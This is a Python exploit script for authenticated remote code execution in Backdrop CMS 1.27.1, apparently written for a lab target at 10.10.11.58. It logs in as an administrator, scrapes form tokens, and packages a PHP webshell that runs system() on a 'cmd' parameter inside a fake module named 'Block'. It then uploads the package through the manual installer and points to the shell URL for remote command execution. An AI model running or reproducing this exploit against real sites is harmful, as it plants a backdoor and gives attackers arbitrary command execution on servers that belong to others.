import os
import time
import tarfile
import argparse
import requests
from bs4 import BeautifulSoup
import re
import json

# parses the arguments (no explanation needed)
def parse_arguments() -> argparse:
    parser = argparse.ArgumentParser(description='Backdrop CMS 1.27.1 Authenticated Remote Code Execution')
    parser.add_argument('--url', type=str, help='Root URL of your backdrop')
    parser.add_argument('--username', type=str, help='Username of the admin user')
    parser.add_argument('--password', type=str, help='Username of the admin user')
    return parser.parse_args()

# creates a backdrop module containing a malicious php webshell
def create_files():
    info_content = """
    type = module
    name = Block
    description = Creates a malicious webshell for.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
    """
    shell_info_path = "shell/shell.info"
    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)
    with open(shell_info_path, "w") as file:
        file.write(info_content)

    shell_content = """
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
    if(isset($_GET['cmd']))
    {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </body>
    </html>
    """
    shell_php_path = "shell/shell.php"
    with open(shell_php_path, "w") as file:
        file.write(shell_content)
    return shell_info_path, shell_php_path

# gets the info and the php file and compresses them with tar.gz
# this is needed because the website accepts tar.gz files only
def create_tar_gz(info_path, php_path):
    zip_filename = "shell.tar.gz"
    tar = tarfile.open(zip_filename, 'w:gz')
    tar.add('shell/shell.info')
    tar.add('shell/shell.php')
    tar.close()
    return zip_filename

# The exploit can only be performed by an authenticated Administrator user
def auth(args):
    session = requests.Session()
    data = {
        "name": args.username,
        "pass": args.password,
        "form_id": "user_login",
        "op": "Log in"
    }
    response = session.post(f'{args.url}?q=user/login', data=data, allow_redirects=False)
    
    if response.status_code == 200:
        print(f"Failed to authenticate: Username or password might be incorrect.")
        exit(1)
    print(f"Authentication successful for {args.username}")
    return session

# In order for the post request to work, we need to scrape the following 3 tokens
def get_theme_token(session, args):
    html = session.get(f'{args.url}?q=admin/installer/manual').text
    match = re.search(r'"theme_token":"(.*?)"', html)
    if match:
        theme_token = match.group(1)
        print(f"Theme Token found: {theme_token}")
    else:
        print("Theme Token not found.")
        exit(1)
    return theme_token

def get_build_id(session, args):
    html = session.get(f'{args.url}?q=admin/installer/manual').text
    soup = BeautifulSoup(html, 'html.parser')
    form_build_id = soup.find('input', {'name': 'form_build_id'})['value']
    print(f"Form Build ID: {form_build_id}")
    return form_build_id

def get_token(session, args):
    html = session.get(f'{args.url}?q=admin/installer/manual').text
    soup = BeautifulSoup(html, 'html.parser')
    form_token = soup.find('input', {'name': 'form_token'})['value']
    print(f"Form Token: {form_token}")
    return form_token

# after uploading, we need to get the id of the batch
def get_batch_id(url):
    match = re.search(r'id=(\d+)', url)
    if match:
        id = match.group(1)
        print(f"Batch ID found: {id}")
        return id

# The main upload part
def upload_file(session, args, form_token, form_build_id, theme_token):
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.85 Mobile/15E148 Safari/604.1",
        "Accept": "application/vnd.backdrop-ajax, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://10.10.11.58",
        "Connection": "keep-alive",
        "Referer": "http://10.10.11.58/?q=admin/installer/manual",
        "Cookie": f"SESS2a92240ad2a89fe19d84dc503867f550={session.cookies.get('SESS2a92240ad2a89fe19d84dc503867f550')}",
        "sec-ch-ua-platform": "iOS",
        "sec-ch-ua": "Google Chrome;v=98, Chromium;v=98, Not=A?Brand;v=24",
        "sec-ch-ua-mobile": "?1",
        "Priority": "u=0"
    }

    data = {
        "bulk": "",
        "project_url": "",
        "form_build_id": form_build_id,
        "form_token": form_token,
        "form_id": "installer_manager_install_form",
        "_triggering_element_name": "op",
        "_triggering_element_value": "Install",
        "ajax_html_ids[]": [
            "skip-link", "main-content", "installer-manager-install-form", "edit-bulk-wrapper", "edit-bulk", 
            "edit-project-url-wrapper", "edit-project-url", "edit-project-upload-wrapper", "edit-project-upload", 
            "edit-actions", "edit-submit", "admin-bar", "admin-bar-wrapper", "admin-bar-icon", "admin-bar-menu", 
            "admin-bar-extra", "admin-bar-search-items", "admin-bar-page-layout", "admin-bar-page-theme", "admin-bar"
        ],
        "ajax_page_state[theme]": "seven",
        "ajax_page_state[theme_token]": theme_token,
        "ajax_page_state[css][core/misc/normalize.css]": "1",
        "ajax_page_state[css][core/modules/system/css/system.css]": "1",
        "ajax_page_state[css][core/modules/system/css/system.theme.css]": "1",
        "ajax_page_state[css][core/modules/system/css/messages.theme.css]": "1",
        "ajax_page_state[js][core/misc/jquery.js]": "1",
        "ajax_page_state[js][core/misc/jquery.once.js]": "1",
    }

    files = {
        "files[project_upload]": ("shell.tar.gz", open("shell.tar.gz", "rb"), "application/gzip")
    }

    response = session.post(f'{args.url}?q=system/ajax', data=data, files=files, headers=headers)
    try:
        json_data = response.json()
    except json.JSONDecodeError as e:
        print(f"Failed to parse JSON response: {e}")
        print(f"Response content: {response.text}")
        exit(1)

    if not json_data:
        print("Exploit failed: No response data received.")
        exit(1)

    # Checking for redirect and handling the batch id
    for item in json_data:
        if item.get("command") == "redirect":
            url = item.get("url")
            id = get_batch_id(url)
            print(f"Redirect URL: {url}, Batch ID: {id}")

            # Trying to perform the next steps
            session.get(url)
            session.post(f'{args.url}/core/authorize.php?batch=1&id={id}&op=do_nojs&op=do')
            session.post(f'{args.url}/core/authorize.php?batch=1&id={id}&op=do_nojs&op=finished')

def main():
    args = parse_arguments()
    if not args.password or not args.username or not args.url:
        print("Usage: python3 exploit.py --url <URL> --username <USERNAME> --password <PASSWORD>")
        exit(1)

    print(f"Attempting authentication for user {args.username}")
    session = auth(args)

    print("Fetching necessary tokens...")
    form_build_id = get_build_id(session, args)
    theme_token = get_theme_token(session, args)
    form_token = get_token(session, args)

    print("Creating the malicious shell files...")
    info_path, php_path = create_files()
    create_tar_gz(info_path, php_path)

    print("Uploading the malicious files...")
    upload_file(session, args, form_token, form_build_id, theme_token)

    print(f"Successfully uploaded the shell! You can access it at:\n{args.url}/modules/shell/shell.php")
    print("Check the shell and execute commands remotely.")

if __name__ == "__main__":
    try:
        main()
    except requests.exceptions.RequestException as e:
        print(f"Request error occurred: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

